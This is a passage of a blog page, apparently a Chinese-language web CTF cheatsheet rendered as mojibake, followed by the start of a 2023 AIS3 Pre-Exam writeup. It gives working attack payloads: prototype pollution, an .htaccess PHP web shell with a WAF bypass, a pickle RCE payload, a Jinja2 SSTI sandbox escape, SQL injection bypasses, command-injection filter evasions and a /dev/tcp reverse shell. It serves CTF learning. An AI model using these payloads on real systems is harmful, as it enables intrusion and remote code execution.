<p>æ‰€ä»¥å…¶å¯¦åœ¨å‘¼å«<code>lst.toString()</code>çš„æ™‚å€™å…¶å¯¦æ˜¯å‘¼å«äº†<code>Array.prototype.toString()</code></p>
<p>è€Œå“ªäº›<code>object</code>çš„prototypeæ˜¯ç”šéº¼å‰‡å®šç¾©åœ¨objectçš„__proto__è£¡é¢</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lst.<span class="property">__proto__</span>.<span class="property">toString</span> == <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>å› æ­¤ï¼Œåœ¨ä¸€äº›æƒ…æ³ä¸‹ï¼Œæœ‰äº›åŠŸèƒ½å¯èƒ½é€ æˆprototypeå¯ä»¥è¢«ç«„æ”¹ï¼Œé€²è€Œå°è‡´prototype pollution</p>
<h3 id="parse-query"><a href="#parse-query" class="headerlink" title="parse query"></a>parse query</h3><p>åœ¨å°æ–¼Arrayé€²è¡Œè³¦å€¼çš„æ™‚å€™ï¼Œæ”»æ“Šè€…å¯ä»¥é€éæ§‹é€ keyç‚º<code>__proto__</code>é”åˆ°prototype pollution</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//parseQuery functionå›å‚³ä¸€å€‹parsedçš„dict</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseQuery</span>(<span class="params">queryString</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> params = &#123;&#125;;</span><br><span class="line">  queryString.<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">param</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [key, value] = param.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    params[key] = value;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Example usage</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;user=admin&amp;isAdmin=true&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parsing user input</span></span><br><span class="line"><span class="keyword">const</span> parsedQuery = <span class="title function_">parseQuery</span>(userInput);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parsedQuery);  <span class="comment">// Output: &#123; user: &#x27;admin&#x27;, isAdmin: &#x27;true&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€éprototype pollutionæŠŠé©—è­‰æ©Ÿåˆ¶ç«„æ”¹æ‰ï¼Œç¹éæª¢æŸ¥æ©Ÿåˆ¶</span></span><br><span class="line"><span class="title function_">parseQuery</span>(<span class="string">&#x27;user=admin&amp;isAdmin=true&amp;__proto__.isAdmin=true&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// isAdminè¢«ç«„æ”¹ï¼Œreturn true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">isAdmin</span>);  <span class="comment">// Output: true</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆä½µç‰©ä»¶"><a href="#åˆä½µç‰©ä»¶" class="headerlink" title="åˆä½µç‰©ä»¶"></a>åˆä½µç‰©ä»¶</h3><p>åˆä½µç‰©ä»¶åŒæ¨£æœ‰å¯èƒ½ç™¼ç”Ÿ</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> prop <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> a[prop] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[prop], b[prop])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[prop] = b[prop]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">c</span>: <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> customConfig = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: 1&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(config, customConfig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">isAdmin</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸é›£çœ‹å‡ºï¼Œå…¶å¯¦åªè¦æœ‰å°Objectçš„keyå’Œvalueé€²è¡Œæ“ä½œï¼Œå°±å¾ˆæœ‰å¯èƒ½å°è‡´prototype pollution</p>
<hr>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>å¯å½±éŸ¿apacheä¼ºæœå™¨ä¸­è³‡æ–™å¤¾å…§çš„æª”æ¡ˆ</p>
<p><strong>åˆ©ç”¨æŒ‡å®š404ã€403ç­‰éŒ¯èª¤éŸ¿æ‡‰æ–‡ä»¶é”æˆLFI</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument <span class="number">404</span> /flag.txt</span><br><span class="line">ErrorDocument <span class="number">404</span> /shell.php</span><br></pre></td></tr></table></figure>

<p><strong>å¼·åˆ¶è§£æéphpæª”æ¡ˆé€ æˆRCE</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br></pre></td></tr></table></figure>

<p><strong>å°‡.htaccessæœ¬èº«ä½œç‚ºphpåŸ·è¡Œå¾Œé–€</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>#ç‚º.htaccessçš„è¨»è§£ç¬¦è™Ÿ</p>
<p><strong>è‹¥æœ‰WAFå‰‡å¯ç”¨\æ›è¡Œç¹é</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p\</span><br><span class="line">hp_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?=echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>


<p>é‡åˆ°\æ™‚ï¼Œæœƒæ¥çºŒä¸‹ä¸€è¡Œ</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p>
<h2 id="Serialize-Deserialize"><a href="#Serialize-Deserialize" class="headerlink" title="Serialize&amp;Deserialize"></a>Serialize&amp;Deserialize</h2><p>å‘¼å«ååºåˆ—åŒ–æ™‚ï¼Œå¯èƒ½å‘¼å«ä¸€äº›Magic Method</p>
<h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><table>
<thead>
<tr>
<th>Value</th>
<th>Serialize(PHP)</th>
</tr>
</thead>
<tbody><tr>
<td>8459302</td>
<td>i:8459302;</td>
</tr>
<tr>
<td>TRUE</td>
<td>b:1;</td>
</tr>
<tr>
<td>NULL</td>
<td>N;</td>
</tr>
<tr>
<td>[â€™xâ€™,1]</td>
<td>a:2:{i:0;s:1:â€xâ€;i:1;i:1;}</td>
</tr>
</tbody></table>
<p><strong>PHP Objectçš„åºåˆ—åŒ–</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;kitten&quot;</span>) =&gt;O:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;kitten&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;  =&gt;&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;.....&#125;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$b</span>; =&gt;&#123;s:<span class="number">6</span>:<span class="string">&quot;\x00Cat\x00b&quot;</span>;.....&#125;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$c</span>; =&gt;&#123;s:<span class="number">4</span>:<span class="string">&quot;\x00*\x00c&quot;</span>;.....&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP Magic Method</span><br><span class="line">åœ¨æŒ‡å®šæ™‚æ©Ÿè‡ªå‹•å‘¼å«magic method</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//Object è¢«éŠ·æ¯€æˆ–garbage collection</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//unserializeæ™‚è§¸ç™¼</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//è¢«å‘¼å«ä¸å­˜åœ¨æ–¹æ³•æ™‚è§¸ç™¼</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//è¢«ç•¶æˆstringè™•ç†æ™‚è§¸ç™¼(å¦‚ echo)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**Python Pickle**</span><br><span class="line">pickle.dumps()æœƒå°‡è³‡æ–™åºåˆ—åŒ–</span><br><span class="line">å¯å¯«payloads</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output,([<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;/flag_5fb2acebf1d0c558&#x27;</span>],))</span><br><span class="line">å†æƒ³è¾¦æ³•æŠŠpayload()å¡é€²dumpsè£¡é¢</span><br></pre></td></tr></table></figure>

<h3 id="Pharèˆ‡ååºåˆ—åŒ–"><a href="#Pharèˆ‡ååºåˆ—åŒ–" class="headerlink" title="Pharèˆ‡ååºåˆ—åŒ–"></a>Pharèˆ‡ååºåˆ—åŒ–</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="SSTI-Server-Side-Template-Injection"><a href="#SSTI-Server-Side-Template-Injection" class="headerlink" title="SSTI(Server Side Template Injection)"></a>SSTI(Server Side Template Injection)</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/2.png"></p>
<p>python Flaské è¨­æ¨¡æ¿ç‚ºJinja2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(template)</span><br><span class="line"><span class="comment">#å¯åšä¸€äº›ç°¡å–®é‹ç®—</span></span><br><span class="line">template=&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125; =&gt;<span class="number">49</span></span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">for</span> item <span class="keyword">in</span> item_list %&#125;</span><br><span class="line">	&#123;&#123; item &#125;&#125;&#123;% <span class="keyword">if</span> <span class="keyword">not</span> loop.last %&#125;,&#123;% endif %&#125;</span><br><span class="line">&#123;%-endfor-%&#125;</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¯ä»¥import os os.system()å—? ä¸è¡Œï¼Œcodeæ˜¯æ”¾åœ¨sandboxä¸­è·‘çš„</span></span><br><span class="line"><span class="string">ä½†å¯ä»¥ç”¨config.from_pyfile(filename)åŸ·è¡Œä»»æ„pythonæª”æ¡ˆ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨_mro_(Method Resolution Order) <strong>bypass Pythonçš„Sandbox</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[].__class__ =&gt;&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="comment">#å°object æŸ¥è©¢method</span></span><br><span class="line"></span><br><span class="line">[].__class__.__mro__ =&gt;(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">&#x27;object&gt;)</span></span><br><span class="line"><span class="string">#_mro_å¯æŸ¥è©¢è§£æç‰©ä»¶é †åºï¼Œæ­¤æ™‚å¯ä»¥ç™¼ç¾æ‰€æœ‰ç‰©ä»¶çš„åº•å±¤çš†ç‚ºobject</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__ =&gt;&lt;class &#x27;</span><span class="built_in">object</span><span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">#_base_å¯è¿”å›æœ€åº•å±¤çš„method,æ‰€ä»¥è¿”å›object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class_.__base_.__subclasses__()</span></span><br><span class="line"><span class="string">#_subclasses_ç›´æ¥è¿”å›æ‰€æœ‰subclassesï¼ŒçŒ›äº†objectåœ¨æœ€åº•å±¤ï¼Œæ‰€ä»¥æ‰€æœ‰ç‰©ä»¶éƒ½æœƒreturn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__.__subclasses__()[132] =&gt;&lt;class &#x27;</span>os._wrap_close<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">#oså‡ºç¾äº†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[].__class__.__base__.__subclasses__()[132].__init__.__globals__ =&gt;è¿”å›æ‰€æœ‰å¯è¢«globalèª¿ç”¨çš„method</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>system<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;)&#125;&#125;</span></span><br><span class="line"><span class="string">#os.systemè¢«Aå‡ºä¾†äº†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;).read()&#125;&#125;</span></span><br><span class="line"><span class="string">#å›å‚³çµæœ</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">SSTI Payload</a><br>æ›´å¤šå¥‡æŠ€æ·«å·§:<a target="_blank" rel="noopener" href="https://tw511.com/a/01/48066.html">https://tw511.com/a/01/48066.html</a></p>
<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><p><a target="_blank" rel="noopener" href="https://www.796t.com/content/1545706659.html">https://www.796t.com/content/1545706659.html</a><br><a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a></p>
<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line">#comment</span><br><span class="line">-- comment     [Note the space after the double dash]</span><br><span class="line">/*comment*/</span><br><span class="line">/*! MYSQL Special SQL */</span><br><span class="line"></span><br><span class="line">PostgreSQL</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line">--comment</span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line">--comment</span><br><span class="line">/*comment*/</span><br><span class="line"></span><br><span class="line">HQL</span><br><span class="line">HQL does not support Comments</span><br></pre></td></tr></table></figure>



<h3 id="å¸¸è¦‹waf"><a href="#å¸¸è¦‹waf" class="headerlink" title="å¸¸è¦‹waf"></a>å¸¸è¦‹waf</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">escape</span>()<span class="operator">-</span><span class="operator">&gt;</span>è¢«è½‰æˆ<span class="operator">%</span>XXï¼Œ@<span class="operator">*</span> _ <span class="operator">+</span> <span class="operator">-</span> . <span class="operator">/</span>ä¸ç·¨ç¢¼</span><br></pre></td></tr></table></figure>

<h3 id="wafç¹é"><a href="#wafç¹é" class="headerlink" title="wafç¹é"></a>wafç¹é</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x27;å¼„ä¸å‡ºä¾†çš„æ™‚å€™å¯ä»¥å˜—è©¦å…©å€‹urlencodeåˆåœ¨ä¸€èµ·</span><br><span class="line">%bf%27ã€%df%27ã€%aa%27</span><br></pre></td></tr></table></figure>

<h2 id="Reversed-Shell"><a href="#Reversed-Shell" class="headerlink" title="Reversed Shell"></a>Reversed Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æœ€ç¶“å…¸</span><br><span class="line">nc -klvp [port] <span class="comment">#attacker&#x27;s host</span></span><br><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/[host]/[port] 0&lt;&amp;1 <span class="comment">#victim</span></span><br></pre></td></tr></table></figure>

<p>å•å°±æ˜¯ <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells.com</a></p>
<h2 id="Commandline-Injection"><a href="#Commandline-Injection" class="headerlink" title="Commandline Injection"></a>Commandline Injection</h2><h3 id="æˆªæ–·æŒ‡ä»¤"><a href="#æˆªæ–·æŒ‡ä»¤" class="headerlink" title="æˆªæ–·æŒ‡ä»¤"></a>æˆªæ–·æŒ‡ä»¤</h3><p>æœ€åŸºæœ¬çš„æˆªæ–·å¯ç”¨<code>;</code>é”æˆï¼Œä¹Ÿå¯ä½¿ç”¨</p>
<ul>
<li><code>cmd1&amp;&amp;cmd2</code>ç•¶<code>cmd1</code> åŸ·è¡ŒæˆåŠŸæ™‚åŸ·è¡Œ<code>cmd2</code></li>
<li><code>cmd1&amp;cmd2</code>ç°¡å–®æ‹¼æ¥ï¼Œç„¡è«–<code>cmd1</code>åŸ·è¡ŒæˆåŠŸèˆ‡å¦éƒ½æœƒåŸ·è¡Œ<code>cmd2</code></li>
<li><code>cmd1||cmd2</code>ç•¶<code>cmd1</code>åŸ·è¡Œå¤±æ•—æ™‚åŸ·è¡Œ&#96;cmd2</li>
<li><code>cmd1|cmd2</code>å°‡<code>cmd1</code>çš„åŸ·è¡Œçµæœä»¥pipelineå¡çµ¦<code>cmd2</code></li>
<li>å¯ä»¥å°‡æŒ‡ä»¤åŒ…åœ¨ <code>\</code>`<code>æˆ–æ˜¯</code>$()&#96; ä¹‹ä¸­</li>
</ul>
<h3 id="ç©ºæ ¼ç¹é"><a href="#ç©ºæ ¼ç¹é" class="headerlink" title="ç©ºæ ¼ç¹é"></a>ç©ºæ ¼ç¹é</h3><ul>
<li>ä½¿ç”¨<code>&lt;&gt;</code>ç¹é<ul>
<li><code>cat&lt;flag</code></li>
<li><code>cat&lt;&gt;flag</code></li>
</ul>
</li>
<li><code>&#123;cat,flag&#125;</code></li>
<li>ä½¿ç”¨ç‰¹æ®Šè®Šé‡<code>$IFS</code>ç¹é(é è¨­æ˜¯ç©ºæ ¼)<ul>
<li><code>cat$IFS./flag</code></li>
<li><code>cat$IFS\flag</code></li>
</ul>
</li>
</ul>
<h3 id="éæ¿¾ç¹é"><a href="#éæ¿¾ç¹é" class="headerlink" title="éæ¿¾ç¹é"></a>éæ¿¾ç¹é</h3><ul>
<li>regexç¹é<ul>
<li><code>/usr/bin/ca? flag</code></li>
</ul>
</li>
<li>åæ–œç·šç¹é<ul>
<li><code>ca\t fl\ag</code></li>
</ul>
</li>
<li>ç©ºè®Šé‡ç¹é<ul>
<li><code>ca$&#123;Z&#125;t flag</code></li>
</ul>
</li>
</ul>
<h3 id="ä¸€äº›çŒ›æ–™"><a href="#ä¸€äº›çŒ›æ–™" class="headerlink" title="ä¸€äº›çŒ›æ–™"></a>ä¸€äº›çŒ›æ–™</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003">https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61011147/article/details/126722464">https://blog.csdn.net/m0_61011147/article/details/126722464</a></p>
</blockquote>
<h2 id="ä¸€äº›æœƒä¸€ç›´æ—ºå­£çš„æ±æ±"><a href="#ä¸€äº›æœƒä¸€ç›´æ—ºå­£çš„æ±æ±" class="headerlink" title="ä¸€äº›æœƒä¸€ç›´æ—ºå­£çš„æ±æ±"></a>ä¸€äº›æœƒä¸€ç›´æ—ºå­£çš„æ±æ±</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/3.png"></p>
<p><img src="/2024/04/30/CTF-Cheatsheet-Web/4.gif"></p>
<h2 id="æ›´å¤šç­†è¨˜"><a href="#æ›´å¤šç­†è¨˜" class="headerlink" title="æ›´å¤šç­†è¨˜"></a>æ›´å¤šç­†è¨˜</h2><p><a target="_blank" rel="noopener" href="https://github.com/splitline/How-to-Hack-Websites">https://github.com/splitline/How-to-Hack-Websites</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/splitline/My-CTF-Challenges/">https://github.com/splitline/My-CTF-Challenges/</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/%E8%B3%87%E5%AD%90%E4%B9%8B%E6%89%8B-%E5%AE%89%E4%B9%8B%E4%BD%A0%E6%88%91/%E8%B3%87%E5%AE%89%E6%96%B0%E6%89%8B%E5%85%A5%E9%96%80%E6%89%8B%E5%86%8A-web-security-%E9%A0%98%E8%88%AA%E4%B9%8B%E8%B7%AF-8d634d9228b5">[è³‡å®‰æ–°æ‰‹å…¥é–€æ‰‹å†Š] Web Security é ˜èˆªä¹‹è·¯</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/">ç®€ä»‹ - CTF Wiki</a></p>
<p><a target="_blank" rel="noopener" href="https://edu-ctf.csie.org/"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-02-07T07:24:52.000Z" title="2024/2/7 ä¸‹åˆ3:24:52">2024-02-07</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-08-28T05:12:47.059Z" title="2024/8/28 ä¸‹åˆ1:12:47">2024-08-28</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/CTF/Writeup/">Writeup</a></span><span class="level-item">11 åˆ†é˜è®€å®Œ (å¤§ç´„1637å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/02/07/2023-AIS3-Pre-Exam-writeup/">2023 AIS3 Pre-Exam writeup</a></p><div class="content"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><pre><code>Are you not a robot ?
FLAG Format: ^AIS3&#123;[A-Z0-9+-*/!?-]+&#125;$

Author: nella17
</code></pre>
<p>é»é–‹pdfï¼Œflagç›´æ¥å¯«åœ¨ä¸Šé¢äº†ï¼Œä¸€é–‹å§‹ä»¥ç‚º-æ˜¯_çµæœæµªè²»ä¸€å †æ™‚é–“</p>
<blockquote>
<p>AIS3{WELC0ME-T0-2023-PRE-EXAM-&amp;-MY-FIRST-CTF}</p>
</blockquote>
<h2 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h2><pre><code>Are you a robot?

Note: This is NOT a reversing or pwn challenge. Don&#39;t reverse the 
binary. It is for local testing only. You will actually get the flag 
after answering all the questions. You can practice locally by running 
./robot AIS3&#123;fake_flag&#125; 127.0.0.1 1234 and it will run the service on 
localhost:1234.

Author: toxicpie

nc chals1.ais3.org 12348
</code></pre>
<p>æ©Ÿå™¨äººæœƒå•ä½ ä¸‰åé¡Œæ•¸å­¸ï¼Œå¯ä»¥ç›´æ¥å¯«Pythonç”¨eval()è§£<br>åœ¨discordçœ‹åˆ°æœ‰äººèªªç›´æ¥ç”¨æ‰‹è§£ï¼Œç‰›çš®</p>
